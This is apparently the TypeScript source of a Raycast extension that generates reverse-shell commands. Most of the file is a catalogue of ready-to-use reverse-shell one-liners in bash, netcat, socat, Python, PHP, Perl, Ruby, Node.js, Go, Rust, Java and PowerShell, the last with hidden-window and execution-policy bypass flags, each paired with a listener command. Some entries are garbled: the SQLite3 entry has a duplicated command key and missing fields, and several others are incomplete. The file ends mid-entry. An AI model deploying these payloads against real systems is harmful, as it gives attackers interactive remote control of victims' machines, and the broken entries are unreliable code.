import { ActionPanel, Action, Form, List, useNavigation, showToast, Toast, Icon, LocalStorage } from "@raycast/api";
import { useState, useEffect } from "react";
import { writeFile } from "fs/promises";
import { homedir } from "os";
import { join } from "path";
import {
  getFileExtension,
  isValidIP,
  isValidPort,
  urlEncode,
  base64Encode,
  groupBySubcategory,
  getOSTagColor,
  type ShellTemplate,
} from "./utils";

// ============================================================================
// Type Definitions
// ============================================================================

interface Config {
  ip: string;
  port: string;
}

// ============================================================================
// Shell Templates (40+ types)
// ============================================================================

const SHELL_TEMPLATES: ShellTemplate[] = [
  // ========== Shell Tools ==========
  {
    type: "bash-tcp",
    name: "Bash TCP",
    icon: "🐚",
    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    description: "Bash reverse shell using /dev/tcp",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "bash-exec",
    name: "Bash Exec",
    icon: "🐚",
    command: 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"',
    description: "Reverse shell executed with bash -c",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "bash-196",
    name: "Bash 196",
    icon: "🐚",
    command: "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
    description: "Bash shell using file descriptor 196",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "bash-udp",
    name: "Bash UDP",
    icon: "🐚",
    command: "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
    description: "Bash shell using UDP",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -u -lvnp {PORT}",
  },

  {
    type: "bash-read-line",
    name: "Bash Read Line",
    icon: "🐚",
    command: "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
    description: "Bash read line reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "bash-5",
    name: "Bash 5",
    icon: "🐚",
    command: "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    description: "Bash 5 reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "zsh",
    name: "Zsh",
    icon: "🐚",
    command: "zsh -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    description: "Zsh reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "nc-busybox",
    name: "BusyBox nc",
    icon: "📦",
    command: "busybox nc {IP} {PORT} -e /bin/sh",
    description: "BusyBox netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "nc-exe",
    name: "nc.exe",
    icon: "📦",
    command: "nc.exe -e cmd.exe {IP} {PORT}",
    description: "Windows netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "ncat-exe",
    name: "ncat.exe",
    icon: "📦",
    command: "ncat.exe {IP} {PORT} -e cmd.exe",
    description: "Windows ncat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "ncat-udp",
    name: "Ncat UDP",
    icon: "📦",
    command: "ncat --udp {IP} {PORT} -e /bin/sh",
    description: "Ncat UDP reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -u -lvnp {PORT}",
  },

  {
    type: "nc-standard",
    name: "Netcat (Standard)",
    icon: "🔌",
    command: "nc -e /bin/bash {IP} {PORT}",
    description: "Standard Netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "nc-fifo",
    name: "Netcat (FIFO)",
    icon: "🔌",
    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
    description: "Netcat variant using FIFO pipe",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "nc-openbsd",
    name: "Netcat (OpenBSD)",
    icon: "🔌",
    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
    description: "OpenBSD Netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "ncat",
    name: "Ncat",
    icon: "🔌",
    command: "ncat {IP} {PORT} -e /bin/bash",
    description: "Ncat tool from Nmap",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "ncat -lvnp {PORT}",
  },
  {
    type: "socat",
    name: "Socat",
    icon: "🔗",
    command: "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    description: "Socat TCP connection reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "socat -d -d TCP-LISTEN:{PORT} STDOUT",
  },

  {
    type: "sqlite3-nc",
    name: "SQLite3 nc",
    icon: "🗃️",
    command: "sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'",
    command:
      "runhaskell -e 'import Network;import System.Process;import Control.Monad(forever);main=withSocketsDo$do s<-connectTo\"{IP}\"(PortNumber {PORT});hSetBuffering s NoBuffering;forever$do hPutStrLn s=<<getLine;hGetLine s>>=putStrLn'",
  },

  {
    type: "socat-tty",
    name: "Socat (TTY)",
    icon: "🔌",
    command: "socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
    description: "Socat reverse shell with TTY",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "socat -d -d TCP-LISTEN:{PORT} STDOUT",
  },

  {
    type: "haskell",
    name: "Haskell",
    icon: "λ",
    command:
      "runhaskell -e 'import Network;import System.Process;main=withSocketsDo$do s<-connectTo\"{IP}\"(PortNumber {PORT});hSetBuffering s NoBuffering;forever$do hPutStrLn s=<<getLine;hGetLine s>>=putStrLn'",
    description: "Haskell reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "telnet",
    name: "Telnet",
    icon: "📞",
    command: "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF",
    description: "Telnet reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  // ========== Scripting Languages ==========
  {
    type: "python2",
    name: "Python 2",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    description: "Python 2 socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "python3",
    name: "Python 3",
    icon: "🐍",
    command:
      'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    description: "Python 3 socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "python-shortest",
    name: "Python (Shortest)",
    icon: "🐍",
    command:
      'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'',
    description: "Shortest Python reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "python-windows",
    name: "Python (Windows)",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));subprocess.call(["cmd.exe"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    description: "Windows Python reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "php-exec",
    name: "PHP (exec)",
    icon: "🐘",
    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP exec reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "php-system",
    name: "PHP (system)",
    icon: "🐘",
    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP system reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "php-passthru",
    name: "PHP (passthru)",
    icon: "🐘",
    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP passthru reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "php-shell_exec",
    name: "PHP (shell_exec)",
    icon: "🐘",
    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP shell_exec reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "php-ivan",
    name: "PHP (Ivan)",
    icon: "🐘",
    command: 'php -r \'$s=fsockopen("{IP}",{PORT});exec("/bin/sh");\'',
    description: "Ivan PHP reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "php-pentestmonkey",
    name: "PHP (PentestMonkey)",
    icon: "🐘",
    command: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PentestMonkey PHP reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "perl-no-sh",
    name: "Perl (no sh)",
    icon: "🐪",
    command:
      "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    description: "Perl reverse shell without /bin/sh",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "perl-pm",
    name: "Perl (PentestMonkey)",
    icon: "🐪",
    command:
      'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));\'',
    description: "PentestMonkey Perl reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "ruby-no-sh",
    name: "Ruby (no sh)",
    icon: "💎",
    command:
      'ruby -rsocket -e \'c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
    description: "Ruby reverse shell without /bin/sh",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "perl",
    name: "Perl",
    icon: "🐪",
    command:
      'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};\'',
    description: "Perl socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "ruby",
    name: "Ruby",
    icon: "💎",
    command:
      'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    description: "Ruby TCPSocket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "nodejs",
    name: "Node.js",
    icon: "🟢",
    command:
      'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
    description: "Node.js net module reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "nodejs-2",
    name: "Node.js #2",
    icon: "🟢",
    command: "require('child_process').exec('nc -e /bin/sh {IP} {PORT}')",
    description: "Node.js reverse shell via nc",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "lua-2",
    name: "Lua #2",
    icon: "🌙",
    command:
      'lua5.1 -e \'local s=require("socket");local t=assert(s.tcp());t:connect("{IP}",{PORT});while true do local r=t:receive();local f=assert(io.popen(r,"r"));t:send(f:read("*a"));end\'',
    description: "Lua reverse shell variant",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "python-2-var",
    name: "Python #2",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    description: "Python reverse shell variant",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  // ========== Compiled Languages ==========
  {
    type: "golang",
    name: "Golang",
    icon: "🔷",
    command:
      'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
    description: "Golang reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "rust",
    name: "Rust",
    icon: "🦀",
    command:
      'echo \'use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main(){let s=TcpStream::connect("{IP}:{PORT}").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe{Stdio::from_raw_fd(fd)}).stdout(unsafe{Stdio::from_raw_fd(fd)}).stderr(unsafe{Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}\' > /tmp/t.rs && rustc /tmp/t.rs -o /tmp/t && /tmp/t && rm /tmp/t /tmp/t.rs',
    description: "Rust reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "crystal",
    name: "Crystal",
    icon: "💎",
    command: 'crystal eval "require \'socket\';c=TCPSocket.new(\\"{IP}\\",{PORT});"',
    description: "Crystal reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "dart",
    name: "Dart",
    icon: "🎯",
    command: "dart -e \"import 'dart:io';Socket.connect('{IP}',{PORT});\"",
    description: "Dart reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "java",
    name: "Java",
    icon: "☕",
    command:
      'echo \'import java.net.*;import java.io.*;public class shell{public static void main(String[]a)throws Exception{Socket s=new Socket("{IP}",{PORT});InputStream i=s.getInputStream();OutputStream o=s.getOutputStream();Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream();OutputStream po=p.getOutputStream();byte[]b=new byte[1024];while(true){int r;i.available()>0?(r=i.read(b)):pi.available()>0?(r=pi.read(b)):(Thread.sleep(50),continue);if(r==-1)break;o.write(b,0,r);po.write(b,0,r);o.flush();po.flush();}s.close();p.destroy();}}\' > /tmp/shell.java && javac /tmp/shell.java && java -cp /tmp shell && rm /tmp/shell.java /tmp/shell.class',
    description: "Java Socket reverse shell (compiles and runs)",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "java-2",
    name: "Java #2",
    icon: "☕",
    command:
      'echo \'class R{public static void main(String[]a)throws Exception{java.net.Socket s=new java.net.Socket("{IP}",{PORT});Process p=Runtime.getRuntime().exec("/bin/sh");new Thread(()->{try{var is=s.getInputStream();var os=p.getOutputStream();int b;while((b=is.read())!=-1)os.write(b);}catch(Exception e){}}).start();var os=s.getOutputStream();var is=p.getInputStream();int b;while((b=is.read())!=-1)os.write(b);}}\' > /tmp/R.java && javac /tmp/R.java && java -cp /tmp R',
    description: "Java reverse shell variant 2",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "java-3",
    name: "Java #3",
    icon: "☕",
    command:
      'echo \'class X{public static void main(String[]a)throws Exception{Process p=Runtime.getRuntime().exec("/bin/sh");java.net.Socket x=new java.net.Socket("{IP}",{PORT});var is=x.getInputStream();var pi=p.getInputStream();var os=x.getOutputStream();var po=p.getOutputStream();while(!x.isClosed()){while(pi.available()>0)os.write(pi.read());while(is.available()>0)po.write(is.read());os.flush();po.flush();Thread.sleep(50);}p.destroy();x.close();}}\' > /tmp/X.java && javac /tmp/X.java && java -cp /tmp X',
    description: "Java reverse shell variant 3",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  // ========== Windows ==========
  {
    type: "powershell-1",
    name: "PowerShell #1",
    icon: "⚡",
    command:
      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    description: "Windows PowerShell reverse shell #1",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "powershell-2",
    name: "PowerShell #2",
    icon: "⚡",
    command:
      "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    description: "Windows PowerShell reverse shell #2",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "powershell-base64",
    name: "PowerShell (Base64)",
    icon: "⚡",
    command:
